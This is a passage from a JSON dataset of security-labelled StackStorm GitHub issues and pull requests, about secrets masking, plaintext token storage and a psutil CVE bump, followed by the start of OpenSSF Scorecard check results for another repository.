                        "body": "is there any update on this? I have a slightly different configuration but the outcome is still the same. Essentially we're storing AWS credentials encrypted in the KV store. These credentials are used for Terraform actions where we store the Terraform state in an S3 bucket:\r\n\r\n```\r\nparameters:\r\n  AWS_DEFAULT_REGION:\r\n    type: \"string\"\r\n    description: \"AWS region for Terraform S3 backend\"\r\n    required: true\r\n    default: \"{{ st2kv.system.tfbackend_AWS_DEFAULT_REGION | decrypt_kv }}\"\r\n    secret: true\r\n  AWS_ACCESS_KEY:\r\n    type: \"string\"\r\n    description: \"AWS Access Key for Terraform S3 backend\"\r\n    required: true\r\n    default: \"{{ st2kv.system.tfbackend_AWS_ACCESS_KEY | decrypt_kv }}\"\r\n    secret: true\r\n  AWS_SECRET_KEY:\r\n    type: \"string\"\r\n    description: \"AWS Secret Key for Terraform S3 backend\"\r\n    required: true\r\n    default: \"{{ st2kv.system.tfbackend_AWS_SECRET_KEY | decrypt_kv }}\"\r\n    secret: true\r\n  RABBITMQ_PASSWORD:\r\n    type: \"string\"\r\n    description: \"Password for RabbitMQ publishing\"\r\n    required: true\r\n    default: \"{{ st2kv.system.RABBITMQ_PASSWORD | decrypt_kv }}\"\r\n    secret: true\r\n  payload:\r\n    type: \"object\"\r\n    required: true\r\n```\r\n\r\nIf this workflow fails at any point, I'm unable to retry it in the Web UI without manually inputting the supposed default values. I've also tried completely clearing out the fields in hopes that the default values from the KV would be retrieved, but this doesn't work either.",
                        "user": "jensenja",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-04-21T21:12:05Z",
                        "url": "https://github.com/StackStorm/st2/issues/5146#issuecomment-1105764810"
                    },
                    {
                        "body": "@jensenja @minsis Are you seeing this issue only through Web UI? Does re-run work fine through CLI?",
                        "user": "khushboobhatia01",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-04-22T04:57:09Z",
                        "url": "https://github.com/StackStorm/st2/issues/5146#issuecomment-1106006565"
                    },
                    {
                        "body": "> @jensenja @minsis Are you seeing this issue only through Web UI? Does re-run work fine through CLI?\n\nI don't think the CLI has a rerun?",
                        "user": "minsis",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-04-25T05:05:45Z",
                        "url": "https://github.com/StackStorm/st2/issues/5146#issuecomment-1108082073"
                    },
                    {
                        "body": "There are re-run options via the CLI: https://docs.stackstorm.com/orquesta/operations.html\r\n\r\nI have not personally attempted it via CLI however.",
                        "user": "jensenja",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-04-25T14:18:33Z",
                        "url": "https://github.com/StackStorm/st2/issues/5146#issuecomment-1108638673"
                    },
                    {
                        "body": "@jensenja What version of StackStorm are you using?\r\n\r\nI've tested this again in 3.6.0 and it seems like everything is now working as expected.",
                        "user": "minsis",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-04-25T15:51:29Z",
                        "url": "https://github.com/StackStorm/st2/issues/5146#issuecomment-1108748819"
                    },
                    {
                        "body": "I'm running 3.6 via the one-liner install on an Ubuntu 20.04 VM:\r\n\r\n```\r\njjensen@destackstorm:~$ dpkg --list | grep st2\r\nii  st2                                   3.6.0-3                            amd64        StackStorm Event-driven automation\r\nii  st2chatops                            3.6.0-1                            amd64        St2Chatops - StackStorm ChatOps.\r\nii  st2web                                3.6.0-1                            amd64        St2Web - StackStorm Web UI.\r\n```",
                        "user": "jensenja",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-04-25T16:06:26Z",
                        "url": "https://github.com/StackStorm/st2/issues/5146#issuecomment-1108765071"
                    },
                    {
                        "body": "@jensenja When the workflow fails, are you trying rerun the entire workflow or just the specific task that failed?\r\n\r\nI'm my case I'm just testing a very simple `core.remote` execution. Also, as suggested have you tried to test the rerun on the CLI?",
                        "user": "minsis",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-04-25T16:18:32Z",
                        "url": "https://github.com/StackStorm/st2/issues/5146#issuecomment-1108779051"
                    },
                    {
                        "body": "Typically the entire workflow, especially if we need some Terraform actions to execute (ie they need to be retried). I've had mixed results on running the individual tasks via the Web UI - namely if the Terraform action task succeeds, the execution flow stops after that specific task completes; the CLI will likely be better for this route as it might appear that the user has more control over task execution via the CLI, just from skimming the docs.",
                        "user": "jensenja",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-04-25T16:22:45Z",
                        "url": "https://github.com/StackStorm/st2/issues/5146#issuecomment-1108783157"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/5145",
                "title": "Passwords in UI and CLI displayed in plain text",
                "labels": [
                    "security"
                ],
                "user": "minsis",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5145,
                "id": 804981858,
                "state": "closed",
                "project_created_at": "2021-02-09T22:32:42Z",
                "closed_at": "2021-06-15T17:32:40Z",
                "body": "## SUMMARY\r\n\r\nUI and CLI clients both show clear text passwords when viewing the config\r\n\r\n### STACKSTORM VERSION\r\n\r\nPaste the output of ``st2 --version``:\r\n\r\nst2 3.3.0, on Python 3.6.9\r\n\r\n##### OS, environment, install method\r\n\r\nOracle 7 using st2-docker\r\n\r\n## Steps to reproduce the problem\r\n\r\nHere I'm just using the core.remote action on an interval timer\r\n\r\n## Expected Results\r\n\r\nPassword shouldn't be displayed in clear text in the config. When going to edit or run the action the password is hidden.\r\n\r\n## Actual Results\r\n\r\nWhat happened? What output did you get?\r\n\r\nMaking sure to follow these steps will guarantee the quickest resolution possible.\r\n\r\nThanks!\r\n![image](https://user-images.githubusercontent.com/11248197/107436973-e8302a80-6af3-11eb-9276-133459063da7.png)\r\n\r\n![image](https://user-images.githubusercontent.com/11248197/107437237-4c52ee80-6af4-11eb-94f7-fd933c703365.png)\r\n\r\n\r\n\r\n",
                "comments": [
                    {
                        "body": "To be clear, the issue here is that, in the rule widget, action parameters and action runner parameters that are marked `secret: true` are not properly obfuscated by the server.\r\n\r\nThis probably also happens for the `passphrase`, `private_key`, and `sudo_password` parameters to the remote runner.",
                        "user": "blag",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-02-09T22:40:33Z",
                        "url": "https://github.com/StackStorm/st2/issues/5145#issuecomment-776292857"
                    },
                    {
                        "body": "Thanks for contributing to this issue. As it has been 90 days since the last activity, we are automatically marking is as stale. If this issue is not relevant or applicable anymore (problem has been fixed in a new version or similar), please close the issue or let us know so we can close it. On the contrary, if the issue is still relevant, there is nothing you need to do, but if you have any additional details or context which would help us when working on this issue, please include it as a comment to this issue.\n",
                        "user": "stale[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-06-02T17:59:12Z",
                        "url": "https://github.com/StackStorm/st2/issues/5145#issuecomment-853264172"
                    },
                    {
                        "body": "A better place to report this might be https://github.com/StackStorm/st2web.",
                        "user": "blag",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-06-02T20:02:00Z",
                        "url": "https://github.com/StackStorm/st2/issues/5145#issuecomment-853345527"
                    },
                    {
                        "body": "Moved to https://github.com/StackStorm/st2web/issues/896",
                        "user": "minsis",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-06-15T17:32:40Z",
                        "url": "https://github.com/StackStorm/st2/issues/5145#issuecomment-861695158"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/5112",
                "title": "Can token in token_d_b  stormed in ciphertext ?",
                "labels": [
                    "enhancement",
                    "question",
                    "status:need more info",
                    "security",
                    "database"
                ],
                "user": "xieyunyun",
                "issue_author_association": "NONE",
                "number": 5112,
                "id": 777767545,
                "state": "open",
                "project_created_at": "2021-01-04T02:02:02Z",
                "closed_at": null,
                "body": "In token_d_b of stackstorm, token is stored in plaintext. Could we provide some method to store the token as ciphertext ?",
                "comments": [
                    {
                        "body": "Thanks for contributing to this issue. As it has been 90 days since the last activity, we are automatically marking is as stale. If this issue is not relevant or applicable anymore (problem has been fixed in a new version or similar), please close the issue or let us know so we can close it. On the contrary, if the issue is still relevant, there is nothing you need to do, but if you have any additional details or context which would help us when working on this issue, please include it as a comment to this issue.\n",
                        "user": "stale[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-06-02T17:59:16Z",
                        "url": "https://github.com/StackStorm/st2/issues/5112#issuecomment-853264248"
                    },
                    {
                        "body": "What's the use case for this?\r\n\r\nAnd I think we would be happy to accept a PR implementing this change, but that will also require a migration script for users to run.",
                        "user": "blag",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-06-02T20:00:01Z",
                        "url": "https://github.com/StackStorm/st2/issues/5112#issuecomment-853344409"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/4983",
                "title": "Remove authentication headers from webhook payloads",
                "labels": [
                    "bug",
                    "security",
                    "size/M"
                ],
                "user": "potato",
                "issue_author_association": "CONTRIBUTOR",
                "number": 4983,
                "id": 649746055,
                "state": "closed",
                "project_created_at": "2020-07-02T08:36:22Z",
                "closed_at": "2020-09-29T20:15:11Z",
                "body": "Authentication headers (along with authentication cookies) shouldn't be stored in the payload of the trigger instance, since authentication data from `GET` query parameters are not stored either.\r\n\r\nNot filtering in `_log_request` since on `DEBUG` loglevel those can be useful data.",
                "comments": [
                    {
                        "body": "[![CLA assistant check](https://cla-assistant.io/pull/badge/signed)](https://cla-assistant.io/StackStorm/st2?pullRequest=4983) <br/>All committers have signed the CLA.",
                        "user": "CLAassistant",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-07-02T08:36:29Z",
                        "url": "https://github.com/StackStorm/st2/pull/4983#issuecomment-652870835"
                    },
                    {
                        "body": "updated the `CHANGELOG.rst`",
                        "user": "potato",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2020-07-02T12:36:15Z",
                        "url": "https://github.com/StackStorm/st2/pull/4983#issuecomment-652979835"
                    },
                    {
                        "body": "Thanks @potato @knagy for the contribution and @nmaludy for review! :+1: \r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2020-09-29T20:15:01Z",
                        "url": "https://github.com/StackStorm/st2/pull/4983#issuecomment-700961174"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/4983",
                    "merged_at": "2020-09-29T20:15:11Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/4884",
                "title": "Bump psutil from 5.6.3 to 5.6.6",
                "labels": [
                    "bug",
                    "enhancement",
                    "security",
                    "external dependency",
                    "size/XS"
                ],
                "user": "dependabot[bot]",
                "issue_author_association": "CONTRIBUTOR",
                "number": 4884,
                "id": 580091795,
                "state": "closed",
                "project_created_at": "2020-03-12T17:19:26Z",
                "closed_at": "2020-04-01T18:42:27Z",
                "body": "Bumps [psutil](https://github.com/giampaolo/psutil) from 5.6.3 to 5.6.6.\n<details>\n<summary>Changelog</summary>\n<p><em>Sourced from <a href=\"https://github.com/giampaolo/psutil/blob/master/HISTORY.rst\">psutil's changelog</a>.</em></p>\n<blockquote>\n<h1>5.6.6</h1>\n<p>2019-11-25</p>\n<p><strong>Bug fixes</strong></p>\n<ul>\n<li>1179_: [Linux] Process cmdline() now takes into account misbehaving processes\nrenaming the command line and using inappropriate chars to separate args.</li>\n<li>1616_: use of Py_DECREF instead of Py_CLEAR will result in double free and\nsegfault\n(<code>CVE-2019-18874 &lt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18874&gt;</code>__).\n(patch by Riccardo Schirone)</li>\n<li>1619_: [OpenBSD] compilation fails due to C syntax error.  (patch by Nathan\nHoughton)</li>\n</ul>\n<h1>5.6.5</h1>\n<p>2019-11-06</p>\n<p><strong>Bug fixes</strong></p>\n<ul>\n<li>1615_: remove pyproject.toml as it was causing installation issues.</li>\n</ul>\n<h1>5.6.4</h1>\n<p>2019-11-04</p>\n<p><strong>Enhancements</strong></p>\n<ul>\n<li>1527_: [Linux] added Process.cpu_times().iowait counter, which is the time\nspent waiting for blocking I/O to complete.</li>\n<li>1565_: add PEP 517/8 build backend and requirements specification for better\npip integration.  (patch by Bernát Gábor)</li>\n</ul>\n<p><strong>Bug fixes</strong></p>\n<ul>\n<li>875_: [Windows] Process' cmdline(), environ() or cwd() may occasionally fail\nwith ERROR_PARTIAL_COPY which now gets translated to AccessDenied.</li>\n<li>1126_: [Linux] cpu_affinity() segfaults on CentOS 5 / manylinux.\ncpu_affinity() support for CentOS 5 was removed.</li>\n<li>1528_: [AIX] compilation error on AIX 7.2 due to 32 vs 64 bit differences.\n(patch by Arnon Yaari)</li>\n<li>1535_: 'type' and 'family' fields returned by net_connections() are not\nalways turned into enums.</li>\n<li>1536_: [NetBSD] process cmdline() erroneously raise ZombieProcess error if\ncmdline has non encodable chars.</li>\n<li>1546_: usage percent may be rounded to 0 on Python 2.</li>\n</ul>\n</tr></table> ... (truncated)\n</blockquote>\n</details>\n<details>\n<summary>Commits</summary>\n<ul>\n<li><a href=\"https://github.com/giampaolo/psutil/commit/c6cd256da95ffe9599792759b1c2586ba24fa047\"><code>c6cd256</code></a> pre release</li>\n<li><a href=\"https://github.com/giampaolo/psutil/commit/b2414b83d3d728ec34ea0e35bfb21517ee231401\"><code>b2414b8</code></a> revert <a href=\"https://github-redirect.dependabot.com/giampaolo/psutil/issues/1595\">#1595</a></li>\n<li><a href=\"https://github.com/giampaolo/psutil/commit/c63369e999b458ecbd559bdde895c344b4db2841\"><code>c63369e</code></a> updat HISTORY</li>\n<li><a href=\"https://github.com/giampaolo/psutil/commit/edb20f664f28653dcdd24f0bf0191984738dca6e\"><code>edb20f6</code></a> linux, cmdline(), fix for <a href=\"https://github-redirect.dependabot.com/giampaolo/psutil/issues/1179\">#1179</a>, comment 552984549: sometimes string ends wit...</li>\n<li><a href=\"https://github.com/giampaolo/psutil/commit/d739cbb1a5b207212d467b219dfc25b017911530\"><code>d739cbb</code></a> use PROCESS_QUERY_LIMITED_INFORMATION</li>\n<li><a href=\"https://github.com/giampaolo/psutil/commit/f7e898b0987f97352c7551bdd9b29b594e1236f6\"><code>f7e898b</code></a> <a href=\"https://github-redirect.dependabot.com/giampaolo/psutil/issues/1595\">#1595</a>: use psutil_pid_is_running() instead of GetExitCodeProcess</li>\n<li><a href=\"https://github.com/giampaolo/psutil/commit/72c84cb4edb5c0968a83c1f45ad5cc51235e0af3\"><code>72c84cb</code></a> #fix <a href=\"https://github-redirect.dependabot.com/giampaolo/psutil/issues/1595\">#1595</a> / windows: kill() may not raise AccessDenied</li>\n<li><a href=\"https://github.com/giampaolo/psutil/commit/1f8d432db12a907544ac533b66a5a61ba25321fb\"><code>1f8d432</code></a> Merge branch 'master' of github.com:giampaolo/psutil</li>\n<li><a href=\"https://github.com/giampaolo/psutil/commit/e6faebcd7adaa327d1ce57385cbebe7724d02350\"><code>e6faebc</code></a> release gil around users()/BSD (<a href=\"https://github-redirect.dependabot.com/giampaolo/psutil/issues/1425\">#1425</a>)</li>\n<li><a href=\"https://github.com/giampaolo/psutil/commit/5cb1b0b526765720253fdb2e8eff0bf380bbe0a8\"><code>5cb1b0b</code></a> Merge branch 'master' of github.com:giampaolo/psutil</li>\n<li>Additional commits viewable in <a href=\"https://github.com/giampaolo/psutil/compare/release-5.6.3...release-5.6.6\">compare view</a></li>\n</ul>\n</details>\n<br />\n\n\n[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=psutil&package-manager=pip&previous-version=5.6.3&new-version=5.6.6)](https://help.github.com/articles/configuring-automated-security-fixes)\n\nDependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.\n\n[//]: # (dependabot-automerge-start)\n[//]: # (dependabot-automerge-end)\n\n---\n\n<details>\n<summary>Dependabot commands and options</summary>\n<br />\n\nYou can trigger Dependabot actions by commenting on this PR:\n- `@dependabot rebase` will rebase this PR\n- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it\n- `@dependabot merge` will merge this PR after your CI passes on it\n- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it\n- `@dependabot cancel merge` will cancel a previously requested merge and block automerging\n- `@dependabot reopen` will reopen this PR if it is closed\n- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually\n- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language\n- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language\n- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language\n- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language\n\nYou can disable automated security fix PRs for this repo from the [Security Alerts page](https://github.com/StackStorm/st2/network/alerts).\n\n</details>",
                "comments": [
                    {
                        "body": "[![CLA assistant check](https://cla-assistant.io/pull/badge/not_signed)](https://cla-assistant.io/StackStorm/st2?pullRequest=4884) <br/>Thank you for your submission! We really appreciate it. Like many open source projects, we ask that you sign our [Contributor License Agreement](https://cla-assistant.io/StackStorm/st2?pullRequest=4884) before we can accept your contribution.<br/><sub>You have signed the CLA already but the status is still pending? Let us [recheck](https://cla-assistant.io/check/StackStorm/st2?pullRequest=4884) it.</sub>",
                        "user": "CLAassistant",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-03-12T17:19:43Z",
                        "url": "https://github.com/StackStorm/st2/pull/4884#issuecomment-598311089"
                    },
                    {
                        "body": "^^ It's amusing to see how bots talk to each other.\r\n\r\n\r\n----\r\n@m4dcoder @Kami I'll leave it for you, - please check if the security-related version bump for pip dependency looks good to merge.",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2020-03-12T19:31:24Z",
                        "url": "https://github.com/StackStorm/st2/pull/4884#issuecomment-598375642"
                    },
                    {
                        "body": "That is a good one :p\n\n> On Mar 12, 2020, at 3:31 PM, Eugen C. <notifications@github.com> wrote:\n> \n> ﻿\n> It's amusing to see how bots talk to each other.\n> \n> —\n> You are receiving this because you are subscribed to this thread.\n> Reply to this email directly, view it on GitHub, or unsubscribe.\n",
                        "user": "punkrokk",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2020-03-12T19:56:54Z",
                        "url": "https://github.com/StackStorm/st2/pull/4884#issuecomment-598385296"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/4884",
                    "merged_at": "2020-04-01T18:42:26Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/4802",
                "title": "WebUI shows secrets in plain text on Rules/Enforcements section",
                "labels": [
                    "bug",
                    "security",
                    "component:st2web"
                ],
                "user": "nicholasamorim",
                "issue_author_association": "CONTRIBUTOR",
                "number": 4802,
                "id": 508415865,
                "state": "open",
                "project_created_at": "2019-10-17T11:37:19Z",
                "closed_at": null,
                "body": "## SUMMARY\r\n\r\nWeb UI shows variables marked as `secret: true` in plain text on Rules/Enforcements.\r\n\r\n`st2` CLI correctly masks it.\r\n\r\n### STACKSTORM VERSION\r\n\r\nst2 3.1.0 running on Python 2.7\r\n\r\n##### OS, environment, install method\r\n\r\nDocker\r\n\r\n## Steps to reproduce the problem\r\n\r\n```\r\n---\r\nname: full_backup\r\npack: mongodb\r\nenabled: true\r\ndescription: Performs a backup of MongoDB\r\nrunner_type: orquesta\r\nentry_point: workflows/full_backup.yaml\r\nparameters:\r\n  mongodb_password:\r\n    default: \"{{ st2kv.system.mongodb_admin_password | decrypt_kv }}\"\r\n    type: string\r\n    secret: true\r\n```\r\n\r\n```\r\nversion: 1.0\r\ndescription: A workflow that backs up Mongo\r\ninput:\r\n  - mongodb_password\r\nvars:\r\n  - stdout: null\r\n  - stderr: null\r\n\r\ntasks:\r\n  run_backup_playbook:\r\n    action: core.noop\r\noutput:\r\n  - stdout: <% ctx(stdout) %>\r\n```\r\n\r\n## Expected Results\r\n\r\nFor the Web UI to mask the password. But it shows on Web UI shows the password in Rules/Enforcements tab.\r\n\r\nUsing the `st2` CLI `execution get` _correctly masks_ the secrets.\r\n\r\n## Actual Results\r\n\r\nWeb UI shows the password in Rules/Enforcements tab. Open an execution and the password is shown in `ACTION INPUT`.\r\n",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/4800",
                "title": "password parameters, although marked as secret, are being stored in mongo as clear text",
                "labels": [
                    "enhancement",
                    "proposal",
                    "security"
                ],
                "user": "cballinc",
                "issue_author_association": "NONE",
                "number": 4800,
                "id": 503755786,
                "state": "open",
                "project_created_at": "2019-10-08T00:16:34Z",
                "closed_at": null,
                "body": "password being stored in clear text in mongo\r\ncollections:\r\n  `action_execution_d_b`\r\n   `live_action`\r\n\r\n![image](https://user-images.githubusercontent.com/5607664/66358035-157c2f80-e926-11e9-9417-0d07d3c4649a.png)\r\n",
                "comments": [
                    {
                        "body": "Thanks for the report!\r\n\r\nThe `secret` property of action parameter is there for \"masking\" secrets in API, logs, UI, CLI for someone who consume the product like operators/users.\r\nSee https://docs.stackstorm.com/reference/secrets_masking.html for more info.\r\n\r\nWe'll be happy to accept PRs to improve this and also decrypt/encrypt this intermidiate data while storing in DB, considering it doesn't break functionality like execution re-run and passing data through workflows.\r\n\r\nStackStorm user passwords, API keys/tokens, secured K/V objects are stored as encrypted in database.",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2019-10-08T11:22:34Z",
                        "url": "https://github.com/StackStorm/st2/issues/4800#issuecomment-539468427"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/4784",
                "title": "Secret action field show as plaint text in rule view",
                "labels": [
                    "bug",
                    "security"
                ],
                "user": "igorfernandes",
                "issue_author_association": "NONE",
                "number": 4784,
                "id": 487631185,
                "state": "closed",
                "project_created_at": "2019-08-30T19:08:59Z",
                "closed_at": "2020-04-16T20:41:04Z",
                "body": "## SUMMARY\r\n\r\nSecret fields are showing as plain text when we see rule information.\r\n\r\n### STACKSTORM VERSION\r\n\r\nst2 3.1.0, on Python 2.7.5\r\n\r\n##### OS, environment, install method\r\n\r\nOS: Oracle Linux 7.5\r\nCustom HA installation with ST2 RPM without changes. All services separate as a single VM.\r\nst2.conf with mask_secrets = True \r\n\r\n## Steps to reproduce the problem\r\n\r\nCreate a RULE with HTTP ACTION and set the password field with anything. When click to see RULE details you can see the password as plain text.\r\n\r\n## Expected Results\r\n\r\nAs a secret parameter of action, that does not need to show in rule information\r\n\r\n## Actual Results\r\n\r\nWe can see all secret field as plain text\r\n\r\n![Screen Shot 2019-08-30 at 3 46 24 PM](https://user-images.githubusercontent.com/3451406/64045630-2627d180-cb40-11e9-88a0-b6b5131c8a77.png)\r\n",
                "comments": [
                    {
                        "body": "Closed by #4807",
                        "user": "igorfernandes",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-04-16T20:41:04Z",
                        "url": "https://github.com/StackStorm/st2/issues/4784#issuecomment-614883556"
                    }
                ],
                "pull_request": null
            }
        ],
        "SecurityPolicy_content_category": [
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 13,
        "num_noncompliant_security_pull": 17,
        "has_generic_policy": false
    },
    {
        "project_name": "dan1hc/fgr",
        "project_url": "https://github.com/dan1hc/fgr",
        "SSF": {
            "date": "2024-10-29T20:51:00+07:00",
            "repo": {
                "name": "github.com/dan1hc/fgr",
                "commit": "5ff54f7792dd43acc191d497ecdaa6967db45eb2"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 6.1,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Warn: 'branch protection settings apply to administrators' is disable on branch 'main'",
                        "Info: 'stale review dismissal' is required to merge on branch 'main'",
                        "Warn: required approving review count is 1 on branch 'main'",
                        "Info: codeowner review is required on branch 'main'",
                        "Info: 'last push approval' is required to merge on branch 'main'",
                        "Warn: no status checks found to merge onto branch 'main'",
                        "Info: PRs are required in order to make changes on branch 'main'"
                    ],
                    "score": 6,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 6,
                    "reason": "7 out of 11 merged PRs checked by a CI test -- score normalized to 6",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 5,
                    "reason": "badge detected: Passing",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "Found 0/30 approved changesets -- score normalized to 0",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: actions contributor org/company found, "
                    ],
                    "score": 3,
                    "reason": "project has 1 contributing companies or organizations -- score normalized to 3",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: GNU Lesser General Public License v3.0: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "0 commit(s) and 0 issue activity found in the last 90 days -- score normalized to 0",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/main.yml:112"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:54: update your workflow using https://app.stepsecurity.io/secureworkflow/dan1hc/fgr/codeql.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:56: update your workflow using https://app.stepsecurity.io/secureworkflow/dan1hc/fgr/codeql.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:60: update your workflow using https://app.stepsecurity.io/secureworkflow/dan1hc/fgr/codeql.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:69: update your workflow using https://app.stepsecurity.io/secureworkflow/dan1hc/fgr/main.yml/main?enable=pin",
